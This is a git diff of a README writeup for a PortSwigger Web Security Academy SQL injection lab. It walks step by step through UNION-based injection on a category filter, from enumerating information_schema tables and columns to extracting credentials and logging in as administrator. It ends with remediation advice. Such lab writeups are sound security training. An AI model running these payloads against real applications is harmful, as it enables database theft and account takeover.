@@ -1,16 +1,15 @@
 <div align="center">
 
-![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)
 ![Status](https://img.shields.io/badge/status-solved-brightgreen?style=flat-square)
-![Year](https://img.shields.io/badge/year-2026-orange?style=flat-square)
-![Platform](https://img.shields.io/badge/platform-PortSwigger%20Web%20Academy-orange?style=flat-square&logo=burpsuite&logoColor=white)
-![Type](https://img.shields.io/badge/type-SQL%20Injection-red?style=flat-square)
-![Technique](https://img.shields.io/badge/technique-UNION%20Attack-darkred?style=flat-square)
+![Platform](https://img.shields.io/badge/platform-PortSwigger-orange?style=flat-square&logo=burpsuite&logoColor=white)
+![Type](https://img.shields.io/badge/attack-SQL%20Injection-red?style=flat-square)
+![Technique](https://img.shields.io/badge/technique-UNION%20Based-blue?style=flat-square)
+![Year](https://img.shields.io/badge/year-2026-gray?style=flat-square)
 
-<h1>SQLi Lab 05 — Listing DB Contents (Non-Oracle)</h1>
-<p><em>UNION-based SQL injection to enumerate tables, columns, and credentials from information_schema.</em></p>
+<h1> SQL Injection — Listing Database Contents (Non-Oracle)</h1>
+<p><em>UNION-based extraction of usernames and passwords via information_schema enumeration</em></p>
 
-[Writeup](#walkthrough) · [Payloads](#payloads) · [Key Takeaways](#key-takeaways)
+[PortSwigger Lab](#) · [Report Bug](#) · [View Writeup](#)
 
 </div>
 
@@ -19,143 +18,192 @@
 ## Table of Contents
 
 - [Overview](#overview)
-- [Why This Lab](#why-this-lab)
-- [Lab Details](#lab-details)
-- [Walkthrough](#walkthrough)
-- [Payloads](#payloads)
+- [Lab Objective](#lab-objective)
+- [Vulnerability Analysis](#vulnerability-analysis)
+- [Attack Methodology](#attack-methodology)
+  - [Step 1 — Column Count Enumeration](#step-1--column-count-enumeration)
+  - [Step 2 — Listing All Tables](#step-2--listing-all-tables)
+  - [Step 3 — Listing Columns in Target Table](#step-3--listing-columns-in-target-table)
+  - [Step 4 — Extracting Credentials](#step-4--extracting-credentials)
+  - [Step 5 — Login as Administrator](#step-5--login-as-administrator)
+- [Payloads Reference](#payloads-reference)
+- [Screenshots](#screenshots)
 - [Key Takeaways](#key-takeaways)
-- [References](#references)
+- [Remediation](#remediation)
 - [Author](#author)
 
 ---
 
 ## Overview
 
-This lab demonstrates a UNION-based SQL injection vulnerability in a product category filter on a simulated e-commerce application. The goal is to enumerate non-Oracle database contents using `information_schema` views — list all tables, identify the users table, extract column names, retrieve credentials, and log in as the `administrator` user.
+This writeup documents the exploitation of a **UNION-based SQL injection** vulnerability found in the product category filter of a PortSwigger Web Security Academy lab. The vulnerability allows an attacker to enumerate the database schema via `information_schema` and extract plaintext credentials from the users table.
+
+The lab simulates a real-world scenario where unsanitized user input is concatenated directly into a SQL query, and query results are reflected in the HTTP response — enabling in-band data extraction.
 
 ---
 
-## Why This Lab
+## Lab Objective
 
-`information_schema` is the universal metadata registry for MySQL, PostgreSQL, MSSQL, and SQLite. Understanding how to query it through a UNION injection is a foundational skill for any web penetration tester — it's the standard enumeration path before tools like `sqlmap` automate it. This lab builds manual fluency with the full chain: column count → table names → column names → data extraction.
+> Exploit the SQL injection vulnerability in the `category` filter parameter to enumerate database tables, identify the users table, extract all usernames and passwords, and log in as the `administrator` user.
 
----
-
-## Lab Details
-
-| Field               | Value                                   |
-| ------------------- | --------------------------------------- |
-| Platform            | PortSwigger Web Security Academy        |
-| Lab Number          | 05                                      |
-| Category            | SQL Injection                           |
-| Technique           | UNION Attack                            |
-| Target DBMS         | Non-Oracle (PostgreSQL / MySQL / MSSQL) |
-| Objective           | Log in as `administrator`               |
-| Vulnerability Point | `category` parameter in product filter  |
+- **Vulnerability Location:** `/filter?category=` parameter
+- **Database Type:** Non-Oracle (PostgreSQL / MySQL)
+- **Attack Type:** UNION-based SQL Injection
+- **Target Table:** `users_cbcldv`
 
 ---
 
-## Walkthrough
+## Vulnerability Analysis
 
-### Step 1 — Confirm UNION Compatibility
-
-Determine number of columns returned by the original query and which columns reflect string data.
-
-```
-/filter?category=Accessories' ORDER BY 2--
-```
-
-Two columns confirmed. Both accept strings.
-
----
-
-### Step 2 — List All Tables via information_schema
-
-Query `information_schema.tables` to dump all user-defined table names.
-
-```
-/filter?category=Accessories' UNION SELECT table_name,NULL FROM information_schema.tables--
-```
-
-<img src="evidence/Listing Tables.png" width="750" alt="Listing Tables via information_schema">
-
-Identify the users table from the output — e.g., `users_cbcldv`.
-
----
-
-### Step 3 — Enumerate Columns of the Target Table
-
-```
-/filter?category=Accessories' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_cbcldv'--
-```
-
-<img src="evidence/Listing password columns.png" width="750" alt="Listing password columns from users table">
-
-Identify username and password column names from the response.
-
----
-
-### Step 4 — Extract Credentials
-
-```
-/filter?category=Accessories' UNION SELECT username_col,password_col FROM users_cbcldv--
-```
-
-<img src="evidence/admin password.png" width="750" alt="Admin password extracted via UNION injection">
-
-Replace `username_col` and `password_col` with the actual names found in Step 3.
-
----
-
-### Step 5 — Login
-
-Navigate to `/login` and authenticate as `administrator` using the extracted password.
-
-<img src="evidence/lab-solved.png" width="750" alt="Lab solved — logged in as administrator">
-
----
-
-## Payloads
+The application constructs a backend query similar to:
 
 ```sql
--- List all tables
-' UNION SELECT table_name,NULL FROM information_schema.tables--
-
--- List columns for a specific table
-' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_cbcldv'--
-
--- Extract credentials
-' UNION SELECT username_col,password_col FROM users_cbcldv--
+SELECT name, description FROM products WHERE category = '[USER INPUT]'
 ```
+
+User input is injected directly without parameterization. A single quote `'` terminates the string literal, and a `UNION SELECT` clause appends attacker-controlled query results to the legitimate response. The `--` sequence comments out the remainder of the original query.
+
+**Conditions met for UNION attack:**
+- Query results are returned in the application response (in-band)
+- The number of columns and their data types can be matched
+- `information_schema` is accessible (non-Oracle database)
+
+---
+
+## Attack Methodology
+
+### Step 1 — Column Count Enumeration
+
+Determine how many columns the original query returns by incrementally adding `NULL` values until no error is thrown:
+
+```sql
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+```
+
+Two `NULL`s returned a valid response — confirming **2 columns**.
+
+---
+
+### Step 2 — Listing All Tables
+
+Query `information_schema.tables` to enumerate all user-defined tables in the database:
+
+```sql
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+```
+
+**Full URL:**
+```
+https://0aff00eb037d2102843ef023001c00e4.web-security-academy.net/filter?category=Accessories%27union+select+table_name,null+from+information_schema.tables--
+```
+
+The response listed all tables. Target identified: **`users_cbcldv`**
+
+---
+
+### Step 3 — Listing Columns in Target Table
+
+Query `information_schema.columns` filtered by the target table name to identify column names:
+
+```sql
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_cbcldv'--
+```
+
+**Full URL:**
+```
+https://0aff00eb037d2102843ef023001c00e4.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20column_name,NULL%20FROM%20information_schema.columns%20WHERE%20table_name=%27users_cbcldv%27--
+```
+
+Columns returned: `username_abcxyz`, `password_abcxyz`
+
+---
+
+### Step 4 — Extracting Credentials
+
+With table and column names confirmed, extract all rows:
+
+```sql
+' UNION SELECT username_abcxyz,password_abcxyz FROM users_cbcldv--
+```
+
+The response returned all username/password pairs including the `administrator` account.
+
+---
+
+### Step 5 — Login as Administrator
+
+Used the extracted `administrator` credentials to authenticate at the application's login endpoint and solve the lab.
+
+---
+
+## Payloads Reference
+
+| Step | Payload |
+|---|---|
+| Column count test | `' UNION SELECT NULL,NULL--` |
+| List all tables | `' UNION SELECT table_name,NULL FROM information_schema.tables--` |
+| List columns | `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_cbcldv'--` |
+| Extract credentials | `' UNION SELECT username_col,password_col FROM users_cbcldv--` |
+
+---
+
+## Screenshots
+
+**Listing Tables**
+
+<img src="./screenshots/Listing Tables.png" width="700" alt="Listing all tables via information_schema">
+
+---
+
+**Listing Password Columns**
+
+<img src="./screenshots/Listing password columns.png" width="700" alt="Enumerating columns in users_cbcldv table">
+
+---
+
+**Admin Password Extracted**
+
+<img src="./screenshots/admin password.png" width="700" alt="Administrator password extracted from database">
+
+---
+
+**Lab Solved**
+
+<img src="./screenshots/lab-solved.png" width="700" alt="Lab solved confirmation">
 
 ---
 
 ## Key Takeaways
 
-- `information_schema.tables` and `information_schema.columns` are accessible on all non-Oracle databases by default
-- UNION attacks require matching column count and compatible data types
-- Table and column names are randomized in this lab — always enumerate first, never guess
-- Oracle uses `ALL_TABLES` and `ALL_TAB_COLUMNS` instead of `information_schema`
+- `information_schema` is available on all major non-Oracle databases (PostgreSQL, MySQL, MSSQL) and is the primary schema enumeration target in UNION attacks.
+- Two-column queries with matching data types are required for a clean UNION injection — enumerate column count first.
+- Reflected query output (in-band) is the prerequisite for UNION-based extraction; blind injection requires boolean/time-based approaches.
+- URL-encoding special characters (`'` → `%27`, space → `+` or `%20`) is necessary when injecting via GET parameters.
 
 ---
 
-## References
+## Remediation
 
-- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-- [SQL Injection — UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
-- [information_schema — MySQL Docs](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)
+| Issue | Fix |
+|---|---|
+| Unsanitized user input in SQL query | Use parameterized queries / prepared statements |
+| Error messages revealing DB structure | Suppress verbose database errors in production |
+| Credentials stored in plaintext | Hash passwords with bcrypt / Argon2 |
+| Unrestricted `information_schema` access | Apply least-privilege DB user permissions |
 
 ---
 
 ## Author
 
-**Michael Asante Anim** · `0x1aerixis`
+**Michael Asante Anim** (`Aerixis`)
 
-[![GitHub](https://img.shields.io/badge/GitHub-anim--michael--asante-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/anim-michael-asante)
-[![X](https://img.shields.io/badge/X-0x1aerixis-000000?style=flat-square&logo=x&logoColor=white)](https://x.com/0x1aerixis)
+- GitHub: [@anim-michael-asante](https://github.com/anim-michael-asante)
+- X: [@0x1aerixis](https://x.com/0x1aerixis)
+- TryHackMe: [0x1aerixis](https://tryhackme.com/p/0x1aerixis)
 
 ---
 
 <div align="center">
-  <sub>Built for learning. Tested on PortSwigger Web Security Academy · 2026</sub>
+  <sub>PortSwigger Web Security Academy · SQL Injection Lab · 2026</sub>
 </div>
